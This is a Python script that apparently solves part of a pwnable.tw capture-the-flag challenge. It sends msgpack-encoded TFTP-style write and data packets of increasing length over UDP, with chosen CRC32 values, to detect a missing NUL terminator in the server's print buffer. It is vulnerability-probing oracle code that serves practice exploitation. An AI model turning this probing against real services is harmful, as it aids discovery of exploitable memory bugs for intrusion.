#!/usr/bin/env python3

import argparse
import re
import socket
import struct
import sys
import time
import zlib

import msgpack


HOST = "chall.pwnable.tw"
TCP_PORT = 10309


def get_udp_port(host, tcp_port):
    io = socket.create_connection((host, tcp_port), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp(io=None):
    if io is None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("0.0.0.0", 0))
    else:
        local_port = io.getsockname()[1]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("0.0.0.0", local_port))
    s.settimeout(5)
    return s


def recv_obj(sock):
    data, _ = sock.recvfrom(65535)
    return msgpack.unpackb(data, raw=False, strict_map_key=False)


def crc32_server(buf):
    return zlib.crc32(buf[1:]) & 0xFFFFFFFF


def send_wrq(sock, host, udp_port, blksize=2048):
    pkt = [2, "x", "octet", {"blksize": blksize}, 0]
    sock.sendto(msgpack.packb(pkt, use_bin_type=True), (host, udp_port))
    return recv_obj(sock)


def send_data_bin(sock, host, udp_port, blockno, data, crc):
    pkt = [3, blockno, crc, data]
    sock.sendto(msgpack.packb(pkt, use_bin_type=True), (host, udp_port))
    try:
        return recv_obj(sock)
    except Exception as e:
        return f"ERR:{e!r}"


def oracle_trial(sock, host, udp_port, data, crc_mode):
    # Printer for BIN starts with a quote, then bin_print_buffer output.
    # For printable bytes, actual memory becomes: b'"' + data, with no guaranteed NUL inside the nominal region.
    prefix = b'"' + data
    if crc_mode == "nominal":
        crc = crc32_server(prefix)
    elif crc_mode == "plus_zero":
        crc = crc32_server(prefix + b"\x00")
    else:
        raise ValueError(crc_mode)
    return crc, send_data_bin(sock, host, udp_port, 1, data, crc)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--tcp-port", type=int, default=TCP_PORT)
    ap.add_argument("--udp-port", type=int)
    ap.add_argument("--start", type=int, default=0x200)
    ap.add_argument("--stop", type=int, default=0x240)
    ap.add_argument("--blksize", type=int, default=2048)
    ap.add_argument("--char", default="A")
    ap.add_argument("--stop-on-pass", action="store_true")
    args = ap.parse_args()

    ch = args.char.encode("latin-1")
    if len(ch) != 1:
        raise SystemExit("--char must be one byte")

    for n in range(args.start, args.stop + 1):
        for mode in ("nominal", "plus_zero"):
            if args.udp_port is not None:
                io = None
                udp_port = args.udp_port
                sock = make_udp(None)
            else:
                io, udp_port = get_udp_port(args.host, args.tcp_port)
                sock = make_udp(io)
            data = ch * n
            wrq = send_wrq(sock, args.host, udp_port, args.blksize)
            crc, resp = oracle_trial(sock, args.host, udp_port, data, mode)
            print(
                f"len=0x{n:x} mode={mode} udp={udp_port} wrq={wrq!r} "
                f"crc=0x{crc:08x} resp={resp!r}",
                flush=True,
            )
            if io is not None:
                io.close()
            sock.close()
            if isinstance(resp, list) and resp[:2] == [4, 1]:
                print("PASS", flush=True)
                if args.stop_on_pass:
                    return


if __name__ == "__main__":
    main()
